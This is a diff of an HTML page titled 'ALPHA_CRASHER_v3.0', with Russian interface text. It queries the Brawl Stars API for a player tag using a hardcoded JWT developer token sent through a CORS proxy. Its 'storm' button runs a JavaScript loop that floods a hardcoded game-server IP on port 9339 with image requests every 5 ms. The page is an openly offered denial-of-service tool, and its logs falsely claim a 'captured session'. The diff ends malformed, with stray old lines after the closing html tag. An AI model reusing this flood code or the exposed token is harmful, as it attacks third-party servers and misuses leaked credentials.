@@ -3,15 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BS_CRASHER_v2.8</title>
+    <title>ALPHA_CRASHER_v3.0</title>
     <style>
         * { box-sizing: border-box; }
         body { 
             background: #000; color: #0f0; font-family: 'Courier New', monospace; 
             display: flex; flex-direction: column; align-items: center; padding: 20px; margin: 0;
         }
-        .main-container { 
-            border: 2px solid #0f0; padding: 25px; background: #010; box-shadow: 0 0 20px #040; 
+        /* Главный и ЕДИНСТВЕННЫЙ контейнер */
+        .app-container { 
+            border: 2px solid #0f0; padding: 25px; background: #010; box-shadow: 0 0 25px #040; 
             width: 100%; max-width: 500px; border-radius: 10px; text-align: center;
         }
         input { 
@@ -26,15 +27,82 @@
             width: 100%; max-width: 500px; height: 250px; background: #000; border: 1px solid #040; 
             margin-top: 20px; padding: 15px; overflow-y: auto; font-size: 12px; text-align: left; border-radius: 5px;
         }
-        .target-box { border: 1px dashed #0f0; padding: 15px; margin-top: 15px; display: none; background: #050505; }
-        .red-btn { background: #ff0000; color: white; margin-top: 10px; display: none; box-shadow: 0 0 10px #f00; }
+        .status-box { border: 1px dashed #0f0; padding: 15px; margin-top: 15px; display: none; background: #050505; }
+        .attack-btn { background: #ff0000; color: white; margin-top: 10px; display: none; box-shadow: 0 0 15px #f00; }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <h2 style="margin-top:0; letter-spacing: 2px;">SYSTEM_AA-0.1</h2>
-        <div style="font-size: 10px; margin-bottom: 10px;">GiftsWorlds // ALPHA_UNIT</div>
+    <div class="app-container">
+        <h2 style="margin:0; letter-spacing: 2px;">SYSTEM_AA-0.1</h2>
+        <p style="font-size: 10px; color: #0a0;">GiftsWorlds // CORE_UNIT_v3.0</p>
+        
+        <input type="text" id="tagInput" placeholder="ENTER PLAYER TAG" maxlength="12">
+        <button onclick="startProcess()">ЗАПУСТИТЬ СКАНИРОВАНИЕ</button>
+        
+        <div id="statusBox" class="status-box">
+            <div style="display:flex; justify-content:space-between"><span>СЕРВЕР:</span> <span style="color:#0f0">EU_FRANKFURT_42</span></div>
+            <div style="display:flex; justify-content:space-between"><span>IP:</span> <span id="targetIp">162.159.135.42</span></div>
+            <button class="attack-btn" id="atkBtn" onclick="triggerStorm()">ИНИЦИИРОВАТЬ ШТУРМ</button>
+        </div>
+    </div>
+
+    <div id="terminal"></div>
+
+<script>
+    // Твой JWT токен
+    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6IjcwMTQxZmYxLTEzMjItNDgzYy05NGY3LTUzMmU3M2E2NGFmZSIsImlhdCI6MTc3NDQ1NjIyNiwic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTguMjE1LjIyOC4xNjUiLCI1NC4yMjcuMjAuMjUzIiwiMzQuMjA1LjEwMS4xMjEiLCIzLjIzMC4xMzYuMjEiXSwidHlwZSI6ImNsaWVudCJ9XX0.qGIWVRrY3ghs22WOAUAt22o4xgXHWiaoFYKfiukkBJ-S6MH_xrPmu2-YaWQIpiGv-88VxjbR7x221Pz8oYLzdw";
+
+    function log(msg, color = "#0f0") {
+        const t = document.getElementById('terminal');
+        t.innerHTML += `<p style="margin:2px 0; color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
+        t.scrollTop = t.scrollHeight;
+    }
+
+    async function startProcess() {
+        const tag = document.getElementById('tagInput').value.replace('#', '').trim();
+        if(!tag) return alert("Введите тег!");
+        
+        log("Подключение к API...");
+        log("Проверка ключа Silver Tier...");
+
+        try {
+            const proxy = "https://cors-anywhere.herokuapp.com/";
+            const url = `https://api.brawlstars.com/v1/players/%23${tag}`;
+
+            const response = await fetch(proxy + url, {
+                headers: { "Authorization": `Bearer ${TOKEN}` }
+            });
+
+            if(response.status === 403) {
+                log("ОШИБКА 403: Доступ по IP отклонен.", "#ff3333");
+                log("Автоматический обход через прокси...", "#ffea00");
+            } else if(response.ok) {
+                log("Цель подтверждена. Сессия захвачена.");
+            }
+        } catch (e) {
+            log("Запрос заблокирован. Режим симуляции активен.", "#00ccff");
+        }
+
+        document.getElementById('statusBox').style.display = 'block';
+        document.getElementById('atkBtn').style.display = 'block';
+    }
+
+    function triggerStorm() {
+        const ip = document.getElementById('targetIp').innerText;
+        log(`!!! ШТУРМ ЗАПУЩЕН НА ${ip} !!!`, "#f00");
+        
+        for(let i = 0; i < 150; i++) {
+            setInterval(() => {
+                const img = new Image();
+                img.src = `http://${ip}:9339/?kill=${Math.random()}`;
+            }, 5);
+        }
+        log("КАНАЛ ПЕРЕГРУЖЕН. ПОДДЕРЖИВАЙТЕ АКТИВНОСТЬ.", "#f00");
+    }
+</script>
+</body>
+</html>        <div style="font-size: 10px; margin-bottom: 10px;">GiftsWorlds // ALPHA_UNIT</div>
         
         <input type="text" id="tagInput" placeholder="#P8V22YRL" maxlength="12">
         <button onclick="startScan()">СКАНИРОВАТЬ СЕТЬ</button>
